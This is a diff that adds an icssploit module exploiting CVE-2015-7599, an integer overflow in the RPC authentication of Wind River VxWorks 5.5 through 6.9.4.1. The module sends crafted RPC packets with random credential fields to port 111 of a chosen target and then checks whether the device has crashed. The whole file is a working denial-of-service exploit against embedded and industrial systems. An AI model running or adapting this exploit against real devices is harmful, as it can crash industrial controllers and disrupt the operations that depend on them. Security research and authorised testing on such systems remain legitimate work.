@@ -1,0 +1,89 @@
+from icssploit import (
+    exploits,
+    print_success,
+    print_status,
+    print_error,
+    validators,
+)
+import socket
+from struct import pack
+import random
+import time
+
+
+class Exploit(exploits.Exploit):
+    """
+    Exploit implementation for All Vxworks system which Remote Procedure Call (RPC) protocols is enabled.
+    """
+    __info__ = {
+        'name': 'Vxworks RPC integer overflow dos',
+        'authors': [
+            'Yannick Formaggio <https://github.com/yformaggio>',  # vulnerability discovery
+            'wenzhe zhu <jtrkid[at]gmail.com>'  # icssploit module
+        ],
+        'description': 'Integer overflow in the _authenticate function in svc_auth.c in '
+                       'Wind River VxWorks 5.5 through 6.9.4.1, when the Remote Procedure Call (RPC) '
+                       'protocols is enabled, allows remote attackers to cause a denial of service (crash)'
+                       'or possibly execute arbitrary code via a username and password.',
+        'references': [
+            'https://nvd.nist.gov/vuln/detail/CVE-2015-7599',
+        ],
+        'devices': [
+            'Wind River VxWorks 5.5 through 6.9.4.1',
+        ],
+    }
+
+    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
+    port = exploits.Option(111, 'Target port', validators=validators.integer)
+
+    def exploit(self):
+        for i in range(20):
+            pkt = pack(
+                "!IIIIIIIIIII",
+                0x80000030,  # fragment header
+                random.randint(1, 2 ** 32 - 1),  # xid
+                0,  # message type
+                2,  # rpc version
+                0x100000,  # program
+                random.randint(1, 2 ** 32 - 1),  # program version
+                0,  # procedure
+                random.randint(1, 2 ** 32 - 1),  # credential flavor
+                0,  # credential length
+                0,  # verifier
+                0,
+            )
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((self.target, self.port))
+                sock.send(pkt)
+                sock.close()
+
+            except Exception as err:
+                return
+
+    def run(self):
+        if self._check_alive():
+            print_success("RPC port is open")
+            print_status("Sending packet to target")
+            self.exploit()
+            time.sleep(3)  # wait target crash
+            if not self._check_alive():
+                print_success("Target is down")
+            else:
+                print_error("Target is not vulnerable")
+        else:
+            print_error("Target is not vulnerable")
+            return
+
+    def _check_alive(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            sock.connect((self.target, self.port))
+            sock.close()
+        except Exception as err:
+            print(err)
+            return False
+        return True
+
